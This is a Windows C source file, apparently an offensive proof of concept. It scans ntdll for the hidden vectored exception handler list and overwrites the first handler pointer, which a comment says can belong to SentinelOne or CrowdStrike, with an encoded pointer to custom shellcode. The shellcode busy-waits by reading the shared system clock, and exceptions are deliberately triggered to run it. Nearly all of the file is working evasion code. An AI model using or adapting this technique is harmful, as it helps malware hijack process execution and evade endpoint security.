#include <Windows.h>
#include <stdio.h>

typedef struct _VECTORED_HANDLER_ENTRY {
	struct _VECTORED_HANDLER_ENTRY* Next;
	struct _VECTORED_HANDLER_ENTRY* Previous;
	ULONG				Refs;
	PVECTORED_EXCEPTION_HANDLER	Handler;
} VECTORED_HANDLER_ENTRY, * PVECTORED_HANDLER_ENTRY;

typedef struct _VEH_HANDLER_ENTRY {
	LIST_ENTRY		Entry;
	PVOID			Idk;
	PVOID			Idk2;
	PVOID			VectoredHandler1;
} VEH_HANDLER_ENTRY, * PVEH_HANDLER_ENTRY;

typedef struct _VECTORED_HANDLER_LIST {
	PVOID			MutexException;
	PVECTORED_HANDLER_ENTRY	FirstExceptionHandler;
	PVECTORED_HANDLER_ENTRY	LastExceptionHandler;
	PVOID			MutexContinue;
	PVECTORED_HANDLER_ENTRY	FirstContinueHandler;
	PVECTORED_HANDLER_ENTRY	LastContinueHandler;
} VECTORED_HANDLER_LIST, * PVECTORED_HANDLER_LIST;

#pragma section(".text")
__declspec(allocate(".text")) const CHAR sleep[] = {

	0x4C, 0x8B, 0x49, 0x08,					// mov r9, [rcx + 0x8]
	0x49, 0x83, 0x81, 0xF8, 0x00, 0x00, 0x00,0x02,		// add qword ptr [r9 + 0xF8], 2
	0x31, 0xC0, 0x31, 0xD2, 0x31, 0xC9, 0x45, 0x31, 0xC0,	// xor eax, eax ; xor edx, edx ; xor ecx, ecx ; xor r8d, r8d
	0x48, 0x8B, 0x04, 0x25, 0x14, 0x00, 0xFE,0x7F,		// mov rax, qword ptr ds:0x7FFE0014
	0x49, 0xC7, 0xC0, 0x80, 0x96, 0x98, 0x00,		// mov r8, 0x989680
	0x49, 0xF7, 0xF0,					// div r8
	0x31, 0xD2, 0x31, 0xC9, 0x48, 0x89, 0xC1, 0x31, 0xD2,	// xor edx, edx ; xor ecx, ecx ; mov rcx, rax ; xor edx, edx
	0x48, 0x8B, 0x04, 0x25, 0x14, 0x00, 0xFE,0x7F,		// mov rax, qword ptr ds:0x7FFE0014
	0x49, 0xF7, 0xF0, 0x48, 0x89, 0xC2, 0x48, 0x29, 0xCA,	// div r8 ; mov rdx, rax ; sub rdx, rcx
	0x48, 0xC7, 0xC0, 0x05, 0x00, 0x00, 0x00,		// mov rax, 0x5
	0x48, 0x39, 0xC2, 0x7C, 0xE1,				// cmp rdx, rax ; jl 0x22
	0x4C, 0x89, 0xC8,					// mov rax, r9
	0xB8, 0xFF, 0xFF, 0xFF, 0xFF,				// mov eax, 0xFFFFFFFF  
	0xC3
};

//For debugging
LONG NTAPI VehhyBoy(PEXCEPTION_POINTERS Info) {
	return EXCEPTION_CONTINUE_EXECUTION;
}

PVOID VehList() {

	int	offset = 0;
	int	i = 1;
	PBYTE	pNext = NULL;
	PBYTE	pRtlpAddVectoredHandler = NULL;
	PBYTE	pVehList = NULL;
	

	PBYTE pRtlAddVectoredExceptionHandler = (PBYTE)GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "RtlAddVectoredExceptionHandler");

	if (!pRtlAddVectoredExceptionHandler)
		return NULL;

	printf("[*] RtlAddVectoredExceptionHandler: 0x%p\n", pRtlAddVectoredExceptionHandler);

	pRtlpAddVectoredHandler = (ULONG_PTR)pRtlAddVectoredExceptionHandler + 0x10;

	printf("[*] RtlpAddVectoredHandler: 0x%p\n", pRtlpAddVectoredHandler);

	while (TRUE) {

		if ((*pRtlpAddVectoredHandler == 0x48) && (*(pRtlpAddVectoredHandler + 1) == 0x8d) && (*(pRtlpAddVectoredHandler + 2) == 0x0d)) {

			if (i == 2) {
				offset = *(int*)(pRtlpAddVectoredHandler + 3);
				pNext = (ULONG_PTR)pRtlpAddVectoredHandler + 7;
				pVehList = pNext + offset;
				return (PVOID)pVehList;
			}
			else {
				i++;
			}
		}

		pRtlpAddVectoredHandler++;
	}

	return NULL;
}

VOID OverWrite(PVOID pShellcode) {

	VECTORED_HANDLER_LIST	handler_list = { 0 };
	VEH_HANDLER_ENTRY	handler_entry = { 0 };
	PVOID			pVehList = VehList();

	if (!pVehList)
		return;

	printf("[*] VEH List: 0x%p\n", pVehList);

	memcpy(&handler_list, pVehList, sizeof(VECTORED_HANDLER_LIST));

	/*
		Don't need to register our own VEH when dealing with S1/CS
		Both of them do VEH shenanigans already
		We can just overwrite the pointer to their VEH
	*/

	if (handler_list.FirstExceptionHandler == (ULONG_PTR)pVehList + sizeof(PVOID)) {
		printf("[!] VEH list has no entries, adding our VEH\n");
		AddVectoredExceptionHandler(1, VehhyBoy);
		memcpy(&handler_list, pVehList, sizeof(VECTORED_HANDLER_LIST));
	}
	else {
		printf("[*] VEH entry already found\n");
	}

	memcpy(&handler_entry, handler_list.FirstExceptionHandler, sizeof(VEH_HANDLER_ENTRY));

	//encode pointer, can be replaced: https://github.com/mannyfred/MShadowVEH/blob/main/MShadowVEH/MShadowVEH/main.c#L230
	handler_entry.VectoredHandler1 = EncodePointer(pShellcode);

	PVOID pEncodedVehPointerLocation = (ULONG_PTR)handler_list.FirstExceptionHandler + offsetof(VEH_HANDLER_ENTRY, VectoredHandler1);

	memcpy(pEncodedVehPointerLocation, &handler_entry.VectoredHandler1, sizeof(PVOID));

	return;
}

VOID SleepyFunk(int a) {

	int b = 0;
	int c = a / b;
	ReadProcessMemory((HANDLE)-1, 0x1234, &c, 0x1234, NULL);
	return;
}

VOID main() {

	int a = 5;
	int b = 1;

	OverWrite(&sleep);

	//Watch your CPU usage
	printf("[*] Sleepy zZZ \n");
	SleepyFunk(a);
	printf("[*] Woke up...\n");
	
	/*
		If we cause an exception with the exact same params, it will do some wonky shit and just somewhat ignore it
		You can also cause other exceptions, eg ACCESS_VIOLATION, ILLEGAL_INSTRUCTION ...
		With EXCEPTION_INT_DIVIDE_BY_ZERO, just pass in a random number/pointer to the SleepyFunk
	*/

	printf("[*] Sleepy zZZ \n");
	SleepyFunk(&sleep);
	printf("[*] Woke up...\n");
		
	MessageBox(NULL, L"So what we thinking", L"Thoughts?", MB_ICONINFORMATION);
	printf("[*] Made it to the end");
	return;
}
